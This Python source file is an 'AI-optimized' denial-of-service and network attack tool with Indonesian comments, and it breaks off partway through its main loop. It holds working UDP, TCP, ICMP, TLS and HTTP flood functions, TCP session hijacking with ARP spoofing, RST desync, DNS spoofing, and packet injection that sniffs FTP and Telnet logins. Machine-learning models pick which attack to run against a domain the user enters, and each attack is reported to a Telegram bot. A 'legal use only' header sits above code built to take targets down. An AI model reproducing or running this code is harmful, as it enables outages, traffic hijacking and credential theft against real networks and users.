# ai_ddos_attack_real_full_optimized.py
# LEGAL USE ONLY - For internal system stress testing & education

import asyncio
import socket
import random
import time
import os
import struct
import ssl
import logging
import httpx
import aiohttp
import threading
import requests

import scapy.all as scapy
import numpy as np
import pandas as pd
import torch
import torch.nn as nn
import torch.optim as optim
import tensorflow as tf
tf.config.run_functions_eagerly(True)

from sklearn.ensemble import IsolationForest
from river import tree
from river import metrics
ocl_model = tree.HoeffdingTreeClassifier()
metric = metrics.Accuracy()
from collections import Counter
from keras.models import Sequential
from keras.layers import Dense, Input
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, Input
from sklearn.tree import DecisionTreeClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score
from joblib import dump, load
from colorama import Fore, Style, init as colorama_init
from sklearn.preprocessing import MinMaxScaler
from tensorflow.keras.models import Model

colorama_init()

# --- Telegram Logger ---
TELEGRAM_TOKEN = 'YOUR TELE TOKEN'
TELEGRAM_CHAT_ID = 'YOUR TELE CHAT ID'

def send_log_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        logging.warning(f"[Telegram Error] {e}")

def report_ddos_event(target_ip, port, method_name, latency):
    msg = f"\U0001F4E1 DDoS Aktif\nTarget: {target_ip}:{port}\nMetode: {method_name}\nLatency: {latency:.2f}s"
    send_log_to_telegram(msg)

class ColorFormatter(logging.Formatter):
    COLORS = {
        logging.DEBUG: Fore.CYAN,
        logging.INFO: Fore.GREEN,
        logging.WARNING: Fore.YELLOW,
        logging.ERROR: Fore.RED,
        logging.CRITICAL: Fore.MAGENTA
    }

    def format(self, record):
        log_color = self.COLORS.get(record.levelno, "")
        reset = Style.RESET_ALL
        time_str = time.strftime("%H:%M:%S", time.localtime(record.created))
        return f"{log_color}[{time_str}] {record.levelname}: {record.getMessage()}{reset}"

handler = logging.StreamHandler()
handler.setFormatter(ColorFormatter())
logging.basicConfig(level=logging.INFO, handlers=[handler])

# DNS cache global
_dns_cache = {}

def resolve_ip_cached(host_or_ip):
    if host_or_ip in _dns_cache:
        return _dns_cache[host_or_ip]
    try:
        info = socket.getaddrinfo(host_or_ip, None, socket.AF_INET)
        ip_address = info[0][4][0]
        _dns_cache[host_or_ip] = ip_address
        return ip_address
    except socket.gaierror:
        logging.error(f"❌ Gagal resolve hostname: {host_or_ip}")
        return None

# --- AI MODULES ---

# --- Anomaly Detector ---
class AnomalyDetector:
    def __init__(self):
        self.model = IsolationForest(n_estimators=100, contamination=0.1)
        self.trained = False

    def fit(self, data):
        self.model.fit(data)
        self.trained = True
        logging.info("📈 Anomaly detector dilatih dengan data latensi.")

    def is_anomalous(self, feature):
        if not self.trained:
            return False
        pred = self.model.predict([feature])  # -1 = anomali, 1 = normal
        return pred[0] == -1

anomaly_detector = AnomalyDetector()

# --- AutoEncoder Anomaly Detector ---
class AutoEncoderAnomalyDetector:
    def __init__(self):
        self.model = None
        self.threshold = None
        self.scaler = MinMaxScaler()
        self.trained = False

    def build_model(self, input_dim):
        input_layer = Input(shape=(input_dim,))
        encoded = Dense(8, activation='relu')(input_layer)
        decoded = Dense(input_dim, activation='linear')(encoded)
        self.model = Model(inputs=input_layer, outputs=decoded)
        self.model.compile(optimizer='adam', loss='mse')

    def fit(self, data):
        data_scaled = self.scaler.fit_transform(data)
        input_dim = data_scaled.shape[1]
        self.build_model(input_dim)
        self.model.fit(data_scaled, data_scaled, epochs=50, batch_size=8, verbose=0)
        reconstructions = self.model.predict(data_scaled)
        mse = np.mean(np.power(data_scaled - reconstructions, 2), axis=1)
        self.threshold = np.percentile(mse, 95)
        self.trained = True
        logging.info("📈 AutoEncoder Anomaly Detector dilatih. Threshold: %.5f", self.threshold)

    def is_anomalous(self, feature):
        if not self.trained:
            return False
        feature_scaled = self.scaler.transform([feature])
        reconstruction = self.model.predict(feature_scaled)
        mse = np.mean(np.power(feature_scaled - reconstruction, 2))
        return mse > self.threshold

class AIDecisionEngine:
    def __init__(self):
        self.model = DecisionTreeClassifier()
        self.features = []
        self.labels = []

    def train(self, data: pd.DataFrame):
        if 'label' not in data.columns:
            logging.error("❌ Dataset tidak memiliki kolom 'label'.")
            return

        X = data.drop('label', axis=1)
        y = data['label']

        # Split data untuk evaluasi
        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3)
        self.model.fit(X_train, y_train)

        # Evaluasi akurasi
        preds = self.model.predict(X_test)
        acc = accuracy_score(y_test, preds)
        logging.info(f"📊 Akurasi DecisionTree: {acc:.2f}")

        # Simpan model
        dump(self.model, 'ai_ddos_model.joblib')
        logging.info("🧠 DecisionTree AI dilatih & disimpan.")

    def load_model(self):
        self.model = load('ai_ddos_model.joblib')
        logging.info("📦 Model DecisionTree berhasil dimuat.")

    def predict(self, feature_row):
        return self.model.predict([feature_row])[0]

    def learn_from_feedback(self, feature_row, label):
        self.features.append(feature_row)
        self.labels.append(label)
        if len(self.features) > 20:
            self.model.fit(self.features, self.labels)
            logging.info("🔄 Model DecisionTree diperbarui dengan data baru.")

class DeepClassifier:
    def __init__(self):
        if os.path.exists('deep_model5.h5'):
            try:
                from tensorflow.keras.models import load_model
                self.model = load_model('deep_model5.h5')
                # Validasi output layer cocok
                if self.model.output_shape[-1] != 15:
                    raise ValueError("❌ Model lama tidak cocok. Rebuild.")
                logging.info("📦 Model Deep Learning berhasil dimuat.")
            except:
                self.model = self._build_model()
                logging.warning("⚠️ Model lama tidak cocok. Menggunakan arsitektur baru.")
        else:
            self.model = self._build_model()


    def _build_model(self):
        model = Sequential()
        model.add(Input(shape=(5,)))
        model.add(Dense(64, activation='relu'))
        model.add(Dense(32, activation='relu'))
        model.add(Dense(16, activation='softmax'))  # Output untuk 15 kelas
        model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy'])
        return model

    def train(self, X, y):
        X_np = np.array(X, dtype=np.float32)
        y_np = np.array(y, dtype=np.int32)
        try:
            self.model.fit(X_np, y_np, epochs=10, verbose=0)
        except ValueError as e:
            logging.warning("❗ Optimizer mismatch – rebuild model & optimizer.")
            self.model = self._build_model()
            self.model.fit(X_np, y_np, epochs=10, verbose=0)
        logging.info("📘 Deep Learning model dilatih ulang.")
        self.save_model()

    def predict(self, features):
        prob = self.model.predict(np.array([features]), verbose=0)
        return int(np.argmax(prob))

    def save_model(self):
        self.model.save('deep_model5.h5')
        logging.info("💾 Model Deep Learning disimpan.")

class RLAgent(nn.Module):
    def __init__(self, input_size=5, output_size=16):
        super(RLAgent, self).__init__()
        self.net = nn.Sequential(
            nn.Linear(5, 64),  # ganti dari 10 ke 5
            nn.ReLU(),
            nn.Linear(64, output_size)
        )
        self.optimizer = optim.Adam(self.parameters(), lr=0.001)
        self.loss_fn = nn.MSELoss()

    def forward(self, x):
        return self.net(x)

    def select_action(self, state):
        with torch.no_grad():
            q_vals = self.forward(torch.tensor(state, dtype=torch.float32))
        return torch.argmax(q_vals).item()

    def train_step(self, state, action, reward):
        q_vals = self.forward(torch.tensor(state, dtype=torch.float32))
        target = q_vals.clone().detach()
        target[action] = reward
        loss = self.loss_fn(q_vals, target)
        self.optimizer.zero_grad()
        loss.backward()
        self.optimizer.step()
        logging.debug("🧪 RLAgent training step executed.")

# --- UTILITAS RESOLUSI IP ---
# --- UPDATE 1: resolve_ip() with IPv6 support ---
def resolve_ip(host_or_ip):
    try:
        info = socket.getaddrinfo(host_or_ip, None, socket.AF_INET)
        for res in info:
            ip = res[4][0]
            if ':' in ip:
                logging.info(f"🌐 Menggunakan IPv6 address: {ip}")
                return ip
        logging.info(f"🌐 Menggunakan IPv4 address: {info[0][4][0]}")
        return info[0][4][0]
    except socket.error:
        return host_or_ip
    
# --- NETWORK MODULES ---
class Flooder:
    def __init__(self, target_host, target_port):
        self.host = target_host
        self.ip = resolve_ip(target_host)
        self.port = target_port

    def udp_flood(self, duration):
        logging.info("🚀 Memulai UDP Flood...")
        family = socket.AF_INET
        sock = socket.socket(family, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                resolved_ip = socket.gethostbyname(self.ip)
            except socket.gaierror:
                logging.error(f"❌ Gagal resolve hostname: {self.ip}")
                return

            sock.sendto(payload, (resolved_ip, self.port))

    def tcp_flood(self, duration):
        logging.info("🚀 Memulai TCP Flood...")
        family = socket.AF_INET
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                sock = socket.socket(family, socket.SOCK_STREAM)
                sock.connect((self.ip, self.port))
                sock.send(random._urandom(1024))
                sock.close()
            except:
                pass

    def tcp_stealth_valid(self, duration=15):
        logging.info("🧪 Memulai valid TCP handshake stealth...")
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                sport = random.randint(1024, 65535)
                seq = random.randint(1000000, 5000000)
                ip = scapy.IP(dst=self.ip)
                syn = scapy.TCP(sport=sport, dport=self.port, flags="S", seq=seq)
                syn_ack = scapy.sr1(ip/syn, timeout=1, verbose=0)

                if syn_ack and syn_ack.haslayer(scapy.TCP) and syn_ack[scapy.TCP].flags == "SA":
                    ack_seq = syn_ack.seq + 1
                    ack = scapy.TCP(sport=sport, dport=self.port, flags="A",
                                    seq=syn_ack.ack, ack=ack_seq)
                    scapy.send(ip/ack, verbose=0)

                    payload_pkt = scapy.TCP(sport=sport, dport=self.port, flags="PA",
                                            seq=syn_ack.ack, ack=ack_seq)
                    payload = b"Hello from simulated client\r\n"
                    scapy.send(ip/payload_pkt/payload, verbose=0)

                    logging.info("✅ Handshake & data dikirim (1 koneksi sah).")

            except Exception as e:
                logging.warning(f"⚠️ Kesalahan saat handshake: {e}")

    def icmp_flood(self, duration):
        logging.info("🚀 Memulai ICMP Flood...")
        packet = scapy.IP(dst=self.ip)/scapy.ICMP()
        timeout = time.time() + duration
        while time.time() < timeout:
            scapy.send(packet, verbose=0)

    def tls_flood(self, duration):
        logging.info("🚀 Memulai TLS Flood...")
        context = ssl.create_default_context()
        family = socket.AF_INET
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                with socket.socket(family, socket.SOCK_STREAM) as sock:
                    sock.connect((self.ip, self.port))
                    with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                        ssock.send(b'GET / HTTP/1.1\r\nHost: ' + self.host.encode() + b'\r\n\r\n')
            except:
                pass

    async def http_or_https_flood(self, ip_or_domain, port, duration, use_https=True):
        proto = "https" if use_https else "http"
        logging.info(f"🚀 Memulai {proto.upper()} Flood...")
        timeout = time.time() + duration

        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/113.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/109.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0.3 Safari/605.1.15"
            ]
        paths = ['/', '/login', '/home', '/api/data', f'/article?id={random.randint(1, 9999)}']
        referers = [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.facebook.com/"
        ]

        connector = aiohttp.TCPConnector(ssl=False if use_https else None, limit_per_host=10)
        async with aiohttp.ClientSession(connector=connector) as session:
            while time.time() < timeout:
                try:
                    headers = {
                            'User-Agent': random.choice(user_agents),
                            'Accept': 'text/html,application/xhtml+xml',
                            'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.8', 'fr-FR,fr;q=0.7']),
                            'Referer': random.choice(referers),
                            'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
                            'Cookie': f"sessionid={random.randint(100000, 999999)}"
                        }

                    path = random.choice(paths)
                    async with session.get(f"{proto}://{ip_or_domain}:{port}{path}", headers=headers) as resp:
                        await resp.text()
                    await asyncio.sleep(random.uniform(0.1, 0.5))  # Stealth delay
                except:
                    pass

    def tcp_hijack(self, duration):
        logging.info("🛠️ TCP Hijack real-world dimulai...")
        timeout = time.time() + duration

        try:
            logging.debug("🔍 Men-sniff paket TCP aktif...")

            #Step 1: Sniff TCP handshake packet (SYN/ACK)
            sniffed = scapy.sniff(
                filter=f"tcp and host {self.ip} and port {self.port}",
                iface = scapy.conf.iface,  # Otomatis deteksi interface aktif
                timeout=5,
                count=5
            )

            for pkt in sniffed:
                if pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.IP):
                    tcp_layer = pkt[scapy.TCP]
                    ip_layer = pkt[scapy.IP]

                    if tcp_layer.flags == "SA":
                        # Step 2: Ambil parameter koneksi
                        victim_ip = ip_layer.src
                        victim_port = tcp_layer.sport
                        seq = tcp_layer.ack
                        ack = tcp_layer.seq + 1

                        logging.info(f"📥 Intercepted: Victim={victim_ip}:{victim_port}, SEQ={seq}, ACK={ack}")

                        # Step 3: Kirim ACK palsu untuk menjalin koneksi palsu
                        ip = scapy.IP(src=self.ip, dst=victim_ip)
                        tcp_ack = scapy.TCP(sport=self.port, dport=victim_port, seq=seq, ack=ack, flags="A")
                        scapy.send(ip/tcp_ack, verbose=0)

                        # Step 4: Kirim data palsu ke koneksi yang sedang dibajak
                        tcp_psh = scapy.TCP(sport=self.port, dport=victim_port, seq=seq, ack=ack, flags="PA")
                        payload = b"HACKED_REAL_TCP_PAYLOAD\r\n"
                        scapy.send(ip/tcp_psh/payload, verbose=0)

                        logging.info("📡 Payload palsu berhasil dikirim ke target.")

            # Waktu menunggu hingga durasi selesai
            while time.time() < timeout:
                time.sleep(1)

        except PermissionError:
            logging.error("🚫 Root access diperlukan untuk TCP hijack.")
        except Exception as e:
            logging.error(f"❌ Gagal melakukan TCP hijack: {e}")

    def tcp_hijack_realistic(self, victim_ip, gateway_ip, duration):
        logging.info("🛠️ Realistic TCP Hijacking with ARP Spoofing + Injection...")

        def arp_spoof():
            pkt_to_victim = scapy.ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
            pkt_to_gateway = scapy.ARP(op=2, pdst=gateway_ip, psrc=victim_ip)
            while not stop_event.is_set():
                scapy.send(pkt_to_victim, verbose=0)
                scapy.send(pkt_to_gateway, verbose=0)
                time.sleep(2)

        def restore_arp():
            scapy.send(scapy.ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
            scapy.send(scapy.ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
            logging.info("🔧 ARP table restored.")

        def sniff_session():
            logging.info("🔍 Men-sniff traffic TCP korban...")
            packets = scapy.sniff(filter=f"tcp and host {self.ip}", timeout=10, count=1)
            for pkt in packets:
                if pkt.haslayer(scapy.TCP):
                    return pkt[scapy.IP], pkt[scapy.TCP]
            return None, None

        stop_event = threading.Event()
        arp_thread = threading.Thread(target=arp_spoof)
        arp_thread.start()

        try:
            ip_layer, tcp_layer = sniff_session()
            if ip_layer is None:
                logging.error("❌ Gagal sniff sesi TCP.")
                return

            seq = tcp_layer.seq + 1
            ack = tcp_layer.ack
            sport = tcp_layer.dport
            dport = tcp_layer.sport

            hijack_pkt = scapy.IP(dst=self.ip, src=victim_ip)/ \
                     scapy.TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags="PA")/ \
                     b"HACKED_INJECTION\r\n"

            timeout = time.time() + duration
            while time.time() < timeout:
                scapy.send(hijack_pkt, verbose=0)
                time.sleep(1)
            logging.info("📤 Injection selesai.")

        except KeyboardInterrupt:
            pass
        finally:
            stop_event.set()
            arp_thread.join()
            restore_arp()

    @staticmethod
    def predict_seq(target_ip, target_port):
        # Kirim SYN ke server target
        ip = scapy.IP(dst=target_ip)
        syn = scapy.TCP(dport=target_port, sport=random.randint(1024, 65535), flags='S')
        syn_ack = scapy.sr1(ip/syn, timeout=1, verbose=0)

        if syn_ack and syn_ack.haslayer(scapy.TCP):
            seq = syn_ack.seq
            print(f"[+] Predicted Server Initial SEQ: {seq}")
            return seq
        else:
            print("[-] Failed to get SYN/ACK from target.")
            return None
        
    @staticmethod
    def predict_seq(target_ip, target_port):
        if ':' in target_ip:
            ip = scapy.IP(dst=target_ip)
        else:
            ip = scapy.IP(dst=target_ip)
        syn = scapy.TCP(dport=target_port, sport=random.randint(1024, 65535), flags='S')
        syn_ack = scapy.sr1(ip/syn, timeout=1, verbose=0)

        if syn_ack and syn_ack.haslayer(scapy.TCP):
            seq = syn_ack.seq
            print(f"[+] Predicted Server Initial SEQ: {seq}")
            return seq
        else:
            print("[-] Failed to get SYN/ACK from target.")
            return None

    @staticmethod   
    def desync_connection(victim_ip, victim_port, server_ip, server_port, ack):
        # Kirim RST untuk "kick" koneksi asli
        rst_pkt = scapy.IP(src=victim_ip, dst=server_ip) / \
                scapy.TCP(sport=victim_port, dport=server_port, flags="R", seq=ack)
        scapy.send(rst_pkt, count=3, verbose=0)
        print("[+] Sent RST packet to desync session.")

    @staticmethod
    def desync_connection(victim_ip, victim_port, server_ip, server_port, ack):
        ip_layer = scapy.IP(src=victim_ip, dst=server_ip)
        rst_pkt = ip_layer / scapy.TCP(sport=victim_port, dport=server_port, flags="R", seq=ack)
        scapy.send(rst_pkt, count=3, verbose=0)
        print("[+] Sent RST packet to desync session.")


    @staticmethod
    def sniff_and_inject(target_ip, keyword=b"GET"):
        def process(pkt):
            if pkt.haslayer(scapy.Raw) and keyword in pkt[scapy.Raw].load:
                ip = pkt[scapy.IP]
                tcp = pkt[scapy.TCP]
                payload = pkt[scapy.Raw].load

                print(f"[+] Detected keyword payload from {ip.src} to {ip.dst}")
                inject_payload(ip.src, ip.dst, tcp.sport, tcp.dport, b"HACKED\r\n")

        scapy.sniff(filter="tcp", prn=process, store=0)

    @staticmethod
    def sniff_and_inject(target_ip, keyword=b"GET"):
        def process(pkt):
            ip_layer = pkt.getlayer(scapy.IP)
            if pkt.haslayer(scapy.Raw) and keyword in pkt[scapy.Raw].load:
                tcp = pkt[scapy.TCP]
                payload = pkt[scapy.Raw].load
                print(f"[+] Detected keyword payload from {ip_layer.src} to {ip_layer.dst}")
                Flooder.inject_payload(ip_layer.src, ip_layer.dst, tcp.sport, tcp.dport, b"HACKED\r\n")
        scapy.sniff(filter="tcp", prn=process, store=0)


    @staticmethod
    def dns_spoof(pkt):
        if pkt.haslayer(scapy.DNS) and pkt.getlayer(scapy.DNS).qr == 0:
            spoofed_pkt = scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst) / \
                        scapy.UDP(dport=pkt[scapy.UDP].sport, sport=53) / \
                        scapy.DNS(id=pkt[scapy.DNS].id, qr=1, aa=1, qd=pkt[scapy.DNS].qd,
                                    an=scapy.DNSRR(rrname=pkt[scapy.DNS].qd.qname, ttl=10, rdata="192.168.1.100"))
            scapy.send(spoofed_pkt, verbose=0)
            print(f"[+] Spoofed DNS response for {pkt[scapy.DNS].qd.qname.decode()}")

    @staticmethod
    def dns_spoof(pkt):
        if pkt.haslayer(scapy.DNS) and pkt.getlayer(scapy.DNS).qr == 0:
            qname = pkt[scapy.DNS].qd.qname.decode()
            is_ipv6 = pkt[scapy.DNS].qd.qtype == 28  # AAAA record
            spoof_ip = "2001:db8::1234" if is_ipv6 else "192.168.1.100"
            ip_layer = scapy.IPv6(dst=pkt[scapy.IPv6].src, src=pkt[scapy.IPv6].dst) if pkt.haslayer(scapy.IPv6) else scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst)
            udp_layer = scapy.UDP(dport=pkt[scapy.UDP].sport, sport=53)
            dns_layer = scapy.DNS(id=pkt[scapy.DNS].id, qr=1, aa=1, qd=pkt[scapy.DNS].qd,
                                an=scapy.DNSRR(rrname=pkt[scapy.DNS].qd.qname, ttl=10, rdata=spoof_ip))
            spoofed_pkt = ip_layer / udp_layer / dns_layer
            scapy.send(spoofed_pkt, verbose=0)
            print(f"[+] Spoofed DNS response for {qname} ({'AAAA' if is_ipv6 else 'A'})")

    @staticmethod
    def payload_aware_inject(pkt):
        if pkt.haslayer(scapy.Raw):
            raw_data = pkt[scapy.Raw].load
            if b"User-Agent" in raw_data:
                print("[+] HTTP detected")
                # Inject JavaScript
                inject_payload(pkt[scapy.IP].src, pkt[scapy.IP].dst, pkt[scapy.TCP].sport,
                            pkt[scapy.TCP].dport, b"HTTP/1.1 200 OK\r\n\r\n<script>alert('hacked');</script>")
            elif b"USER" in raw_data or b"PASS" in raw_data:
                print("[+] FTP login sniffed:")
                print(raw_data.decode(errors="ignore"))
            elif b"login" in raw_data:
                print("[+] Telnet login detected")

    @staticmethod
    def payload_aware_inject(pkt):
        if pkt.haslayer(scapy.Raw):
            raw_data = pkt[scapy.Raw].load
            ip_layer = pkt[scapy.IPv6] if pkt.haslayer(scapy.IPv6) else pkt[scapy.IP]
            tcp_layer = pkt[scapy.TCP]
            if b"User-Agent" in raw_data:
                print("[+] HTTP detected")
                Flooder.inject_payload(ip_layer.src, ip_layer.dst, tcp_layer.sport,
                                    tcp_layer.dport, b"HTTP/1.1 200 OK\r\n\r\n<script>alert('hacked');</script>")
            elif b"USER" in raw_data or b"PASS" in raw_data:
                print("[+] FTP login sniffed:")
                print(raw_data.decode(errors="ignore"))
            elif b"login" in raw_data:
                print("[+] Telnet login detected")

    
    @staticmethod
    def dns_spoof_auto():
        logging.info("🔎 Men-sniff paket DNS untuk spoofing...")
        pkt = scapy.sniff(filter="udp port 53", count=1, timeout=10)
        if pkt:
            Flooder.dns_spoof(pkt[0])
        else:
            logging.warning("❌ Tidak ada paket DNS terdeteksi.")

    @staticmethod
    def payload_aware_inject_auto():
        logging.info("🔎 Men-sniff paket TCP untuk inject payload (aware)...")
        pkt = scapy.sniff(filter="tcp", count=1, timeout=10)
        if pkt:
            Flooder.payload_aware_inject(pkt[0])
        else:
            logging.warning("❌ Tidak ada paket TCP terdeteksi.")


    @staticmethod
    def inject_payload(src, dst, sport, dport, payload, seq=None, ack=0):
        if seq is None:
            seq = random.randint(100000, 200000)
        ip = scapy.IP(src=src, dst=dst)
        tcp = scapy.TCP(sport=sport, dport=dport, flags="PA", seq=seq, ack=ack)
        pkt = ip / tcp / payload
        scapy.send(pkt, verbose=0)
        print(f"[+] Injected payload with seq={seq}, ack={ack}: {payload}")

    @staticmethod
    def inject_payload(src, dst, sport, dport, payload, seq=None, ack=0):
        if seq is None:
            seq = random.randint(100000, 200000)
        ip_layer = scapy.IP(src=src, dst=dst)
        tcp = scapy.TCP(sport=sport, dport=dport, flags="PA", seq=seq, ack=ack)
        pkt = ip_layer / tcp / payload
        scapy.send(pkt, verbose=0)
        print(f"[+] Injected payload with seq={seq}, ack={ack}: {payload}")

    @staticmethod
    def full_tcp_takeover(victim_ip, victim_port, server_ip, server_port):
        logging.info("🎯 Melakukan Full TCP Hijack + Kick Client + Inject Payload...")

        # Step 1: Kirim RST ke korban untuk putuskan koneksi
        rst_pkt = scapy.IP(src=victim_ip, dst=server_ip) / \
                scapy.TCP(sport=victim_port, dport=server_port, flags="R", seq=1000)
        scapy.send(rst_pkt, count=3, verbose=0)
        logging.info("💥 RST dikirim ke korban untuk putuskan koneksi.")

        # Step 2: Kirim ACK/PSH dari attacker untuk takeover
        takeover_pkt = scapy.IP(src=victim_ip, dst=server_ip) / \
                    scapy.TCP(sport=victim_port, dport=server_port, seq=1000, ack=1001, flags="PA") / \
                    b"TAKEOVER_PAYLOAD\r\n"
        scapy.send(takeover_pkt, count=3, verbose=0)
        logging.info("📤 Payload takeover berhasil dikirim ke server.")

    @staticmethod
    def full_tcp_takeover(victim_ip, victim_port, server_ip, server_port):
        logging.info("🎯 Melakukan Full TCP Hijack + Kick Client + Inject Payload...")
        ip_layer = scapy.IP(src=victim_ip, dst=server_ip)
        rst_pkt = ip_layer / scapy.TCP(sport=victim_port, dport=server_port, flags="R", seq=1000)
        scapy.send(rst_pkt, count=3, verbose=0)
        logging.info("💥 RST dikirim ke korban untuk putuskan koneksi.")

        takeover_pkt = ip_layer / scapy.TCP(sport=victim_port, dport=server_port, seq=1000, ack=1001, flags="PA") / b"TAKEOVER_PAYLOAD\r\n"
        scapy.send(takeover_pkt, count=3, verbose=0)
        logging.info("📤 Payload takeover berhasil dikirim ke server.")



        
# --- GAN PAYLOAD GENERATOR (DEMO PLACEHOLDER) ---
def generate_gan_payload():
    return random._urandom(512)

# --- FEEDBACK CAPTURE ---
def collect_feedback(ip, port):
    try:
        start = time.time()
        conn = socket.create_connection((ip, port), timeout=2)
        latency = time.time() - start
        conn.close()
        return latency
    except:
        return 5.0

# --- DETEKSI TARGET DOWN OTOMATIS ---
def is_target_down(ip, port, timeout=2):
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return False
    except:
        return True

# --- MAIN ---
method_names = [
    "UDP Flood", "TCP Flood", "ICMP Flood", "TLS Flood", "HTTP Flood",
    "TCP Hijack", "Realistic Hijack", "Predict TCP SEQ",
    "Desync TCP Connection", "Sniff & Inject",
    "DNS Spoof", "Payload-Aware Inject",
    "Manual Payload Inject", "Full TCP Takeover",
    "TCP Stealth Handshake", "Fallback UDP Flood"
]
ae_anomaly_detector = AutoEncoderAnomalyDetector()
TOTAL_METHODS = 16
async def main():
    global ae_anomaly_detector
    input_host = input(Fore.CYAN + "🌐 Target Domain/Website: " + Style.RESET_ALL)
    if input_host.startswith("http://") or input_host.startswith("https://"):
        input_host = input_host.split("//", 1)[1]
    
    try:
        port = int(input(Fore.CYAN + "🔌 Target Port: " + Style.RESET_ALL))
        if not (1 <= port <= 65535):
            raise ValueError("Port berada di luar rentang valid.")
    except ValueError:
        logging.error("❌ Port harus berupa angka valid antara 1–65535!")
        return
    
    current_ip = resolve_ip(input_host)
    original_ip = current_ip

    ai = AIDecisionEngine()
    deep_ai = DeepClassifier()
    rl_agent = RLAgent()

    if os.path.exists('ai_ddos_model.joblib'):
        ai.load_model()
    else:
        data = []
        labels = list(range(8))  # 0–7 untuk 8 jenis serangan
        rows_per_label = 15

        for label in labels:
            for _ in range(rows_per_label):
                if label == 0:  # UDP Flood
                    features = [random.randint(10, 30) for _ in range(5)]
                elif label == 1:  # TCP Flood
                    features = [random.randint(30, 60) for _ in range(5)]
                elif label == 2:  # ICMP Flood
                    features = [random.randint(5, 20), random.randint(70, 90), random.randint(5, 20), random.randint(70, 90), random.randint(5, 20)]
                elif label == 3:  # TLS Flood
                    features = [random.randint(60, 90) for _ in range(5)]
                elif label == 4:  # HTTP Flood
                    features = [random.randint(40, 60), random.randint(80, 100), random.randint(40, 60), random.randint(80, 100), random.randint(40, 60)]
                elif label == 5:  # TCP Hijack
                    features = [90, 90, 70, 50, 30]
                elif label == 6:  # Realistic Hijack
                    features = [100, 90, 80, 70, 60]
                elif label == 7:  # ICMPv6 Flood
                    features = [random.randint(80, 100) for _ in range(5)]
                data.append(features + [label])

        df = pd.DataFrame(data, columns=["f1", "f2", "f3", "f4", "f5", "label"])
        ai.train(df)

        try:
            anomaly_features = [row[:-1] for row in data]  # Semua kolom kecuali label
            anomaly_detector.fit(anomaly_features)
        except Exception as e:
            logging.warning(f"⚠️ Gagal latih anomaly detector: {e}")
        try:
            ae_anomaly_detector = AutoEncoderAnomalyDetector()
            ae_anomaly_detector.fit(anomaly_features)
        except Exception as e:
            logging.warning(f"⚠️ Gagal latih AutoEncoder: {e}")

    deep_X, deep_y = [], []
    down_count = 0
    max_down_threshold = 3

    use_manual_mode = input(Fore.YELLOW + "⚙️ Gunakan mode manual? (y/n): " + Style.RESET_ALL).strip().lower() == 'y'

    if use_manual_mode:
        print(Fore.GREEN + "🧰 Mode manual aktif. Kamu akan memilih satu metode serangan untuk dijalankan terus-menerus." + Style.RESET_ALL)
        try:
            manual_method = int(input(Fore.MAGENTA + "🚀 Masukkan metode (0–15) yang akan diulang: " + Style.RESET_ALL))
            if not (0 <= manual_method <= 15):
                print(Fore.RED + "❌ Input tidak valid, menggunakan UDP Flood (0)." + Style.RESET_ALL)
                manual_method = 0
        except ValueError:
            print(Fore.RED + "❌ Input bukan angka, menggunakan UDP Flood (0)." + Style.RESET_ALL)
            manual_method = 0
    else:
        print(Fore.GREEN + "🤖 Mode AI aktif. Metode akan dipilih berdasarkan model AI." + Style.RESET_ALL)



    while True:
        resolved_ip = resolve_ip(input_host)
        if resolved_ip != current_ip:
            logging.warning(f"🔄 IP target berubah dari {current_ip} ke {resolved_ip}. Menyesuaikan...")
            current_ip = resolved_ip

        if is_target_down(current_ip, port):
            logging.warning("⚠️ Target tidak merespons, akan mencoba ulang dalam beberapa detik...")
            await asyncio.sleep(5)  # Coba lagi setelah 5 detik
            continue


        features = [random.randint(10, 100) for _ in range(5)]
        features_dict = {f"f{i+1}": v for i, v in enumerate(features)}

        if use_manual_mode:
            method = manual_method
        else:
            try:
                method_ai = ai.predict(features)
            except:
                method_ai = random.randint(0, 6)

            method_dl = deep_ai.predict(features)
            method_rl = rl_agent.select_action(features)

            try:
                method_ocl = ocl_model.predict_one(features_dict)
                if method_ocl is None:
                    method_ocl = random.randint(0, 6)
            except:
                    method_ocl = random.randint(0, 6)

            methods = [method_ai, method_dl, method_rl, method_ocl]
            votes = Counter(methods)

            if len(votes) >= 3:
                method = votes.most_common(1)[0][0]
            else:
                method = random.choice(methods)

            method = max(0, min(method, TOTAL_METHODS - 1))
            print(f"[🧠 Voting] DTree={method_ai}, DL={method_dl}, RL={method_rl} ➜ FINAL={method}")


        flooder = Flooder(input_host, port)
        duration = 10
        if method == 0:
            flooder.udp_flood(duration)
        elif method == 1:
            flooder.tcp_flood(duration)
        elif method == 2:
            flooder.icmp_flood(duration)
        elif method == 3:
            flooder.tls_flood(duration)
        if method == 4:
